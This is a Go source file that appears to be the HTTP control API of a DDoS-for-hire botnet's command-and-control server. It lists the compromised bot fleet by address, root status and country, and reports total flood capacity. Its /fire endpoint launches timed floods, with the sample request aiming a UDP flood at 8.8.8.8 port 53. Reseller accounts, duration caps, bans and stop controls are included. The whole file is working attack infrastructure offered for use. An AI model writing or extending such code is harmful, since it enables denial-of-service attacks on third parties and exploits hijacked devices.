// language: Go, file: cnc/internal/api/api.go
// *3434: JSON control surface behind auth.Store.Middleware. console + resellers hit this.*
package api

import (
	"encoding/json"
	"net"
	"net/http"
	"strconv"
	"time"

	"bigheights/cnc/internal/attack"
	"bigheights/cnc/internal/auth"
	"bigheights/cnc/internal/protocol"
	"bigheights/cnc/internal/registry"
	"bigheights/cnc/internal/users"
)

// Server wires the API handlers.
type Server struct {
	Addr string
	Reg  *registry.Registry
	Disp *attack.Dispatcher
	Users *users.Store
	Keys *auth.Store
}

// Handler returns the guarded mux for :3434.
func (s *Server) Handler() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("/stats", s.handleStats)
	mux.HandleFunc("/fleet", s.handleFleet)
	mux.HandleFunc("/attacks", s.handleAttacks)
	mux.HandleFunc("/fire", s.handleFire)
	mux.HandleFunc("/stop", s.handleStop)
	mux.HandleFunc("/stopall", s.handleStopAll)
	mux.HandleFunc("/hold", s.handleHold)
	return s.Keys.Middleware(mux)
}

// Listen blocks until the listener errors or is closed.
func (s *Server) Listen() error {
	ln, err := net.Listen("tcp", s.Addr)
	if err != nil {
		return err
	}
	return http.Serve(ln, s.Handler())
}

// ---- handlers ----

func (s *Server) handleStats(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeErr(w, http.StatusMethodNotAllowed, "GET only")
		return
	}
	st := s.Reg.Aggregate()
	writeJSON(w, http.StatusOK, map[string]any{
		"total":       st.Total,
		"rooted":      st.Rooted,
		"arch":        st.Arch,
		"country":     st.Country,
		"total_ram":   st.TotalRAM,
		"total_cores": st.TotalCores,
		"max_power":   st.MaxPowerMBS,
		"hold":        s.Users.Hold(),
		"running":     len(s.Disp.List()),
	})
}

func (s *Server) handleFleet(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeErr(w, http.StatusMethodNotAllowed, "GET only")
		return
	}
	bots := s.Reg.Snapshot()
	type row struct {
		ID      uint64 `json:"id"`
		Addr    string `json:"addr"`
		Arch    string `json:"arch"`
		Cores   int    `json:"cores"`
		RAM     int    `json:"ram"`
		Rooted  bool   `json:"rooted"`
		Country string `json:"country"`
		Joined  string `json:"joined"`
		Seen    string `json:"seen"`
	}
	out := make([]row, 0, len(bots))
	for _, b := range bots {
		out = append(out, row{
			ID: b.ID, Addr: b.Addr, Arch: b.Arch, Cores: b.Cores,
			RAM: b.RAM, Rooted: b.Rooted, Country: b.Country,
			Joined: b.JoinedAt.UTC().Format(time.RFC3339),
			Seen:   b.LastSeen.UTC().Format(time.RFC3339),
		})
	}
	writeJSON(w, http.StatusOK, map[string]any{"count": len(out), "bots": out})
}

func (s *Server) handleAttacks(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeErr(w, http.StatusMethodNotAllowed, "GET only")
		return
	}
	list := s.Disp.List()
	type row struct {
		PID      uint32 `json:"pid"`
		User     string `json:"user"`
		Method   string `json:"method"`
		Target   string `json:"target"`
		Port     uint16 `json:"port"`
		Duration uint8  `json:"duration"`
		Started  string `json:"started"`
		Sent     int64  `json:"sent"`
	}
	out := make([]row, 0, len(list))
	for _, x := range list {
		out = append(out, row{
			PID: x.PID, User: x.User, Method: x.Method, Target: x.Target,
			Port: x.Port, Duration: x.Duration,
			Started: x.Started.UTC().Format(time.RFC3339), Sent: x.Sent,
		})
	}
	writeJSON(w, http.StatusOK, map[string]any{"count": len(out), "attacks": out})
}

// fire request body:
//   {"line":"udp 8.8.8.8 30 port=53 threads=2 len=1440","user":"alice"}
// line is the same console verb grammar; no --bots selection per spec.
func (s *Server) handleFire(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeErr(w, http.StatusMethodNotAllowed, "POST only")
		return
	}
	if s.Users.Hold() {
		writeErr(w, http.StatusConflict, "bots are on hold")
		return
	}
	var body struct {
		Line string `json:"line"`
		User string `json:"user"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeErr(w, http.StatusBadRequest, "bad json")
		return
	}
	if body.User == "" {
		body.User = "api"
	}

	// per-user gate
	if body.User != "api" {
		u, ok := s.Users.Get(body.User)
		if !ok {
			writeErr(w, http.StatusForbidden, "unknown user")
			return
		}
		if u.Banned {
			writeErr(w, http.StatusForbidden, "user banned")
			return
		}
		if u.MaxTime > 0 {
			req, err := attack.Parse(body.Line, s.Disp.NextPID)
			if err != nil {
				writeErr(w, http.StatusBadRequest, err.Error())
				return
			}
			if int(req.Duration) > u.MaxTime {
				writeErr(w, http.StatusForbidden, "duration exceeds account max")
				return
			}
			req.PID = s.Disp.NextPID() // recompute after discard from probe
			sent, total := s.Disp.Fire(req, body.User)
			writeJSON(w, http.StatusOK, map[string]any{
				"pid": req.PID, "method": req.MethodNm, "target": req.Target.String(),
				"duration": req.Duration, "sent": sent, "fleet": total,
			})
			return
		}
	}

	req, err := attack.Parse(body.Line, s.Disp.NextPID)
	if err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	sent, total := s.Disp.Fire(req, body.User)
	writeJSON(w, http.StatusOK, map[string]any{
		"pid": req.PID, "method": req.MethodNm, "target": req.Target.String(),
		"duration": req.Duration, "sent": sent, "fleet": total,
	})
}

func (s *Server) handleStop(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeErr(w, http.StatusMethodNotAllowed, "POST only")
		return
	}
	pidStr := r.URL.Query().Get("pid")
	n, err := strconv.ParseUint(pidStr, 10, 32)
	if err != nil {
		writeErr(w, http.StatusBadRequest, "pid required")
		return
	}
	ok := s.Disp.Stop(uint32(n))
	writeJSON(w, http.StatusOK, map[string]any{"pid": n, "stopped": ok})
}

func (s *Server) handleStopAll(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeErr(w, http.StatusMethodNotAllowed, "POST only")
		return
	}
	n := s.Disp.StopAll()
	writeJSON(w, http.StatusOK, map[string]any{"killed": n})
}

func (s *Server) handleHold(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeErr(w, http.StatusMethodNotAllowed, "POST only")
		return
	}
	var body struct{ On bool `json:"on"` }
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeErr(w, http.StatusBadRequest, "bad json")
		return
	}
	state := s.Users.SetHold(body.On)
	if state {
		s.Disp.StopAll()
	}
	writeJSON(w, http.StatusOK, map[string]any{"hold": state})
}

// ---- helpers ----

func writeJSON(w http.ResponseWriter, code int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_ = json.NewEncoder(w).Encode(v)
}

func writeErr(w http.ResponseWriter, code int, msg string) {
	writeJSON(w, code, map[string]any{"error": msg})
}

// keep protocol import live if handlers evolve
var _ = protocol.Magic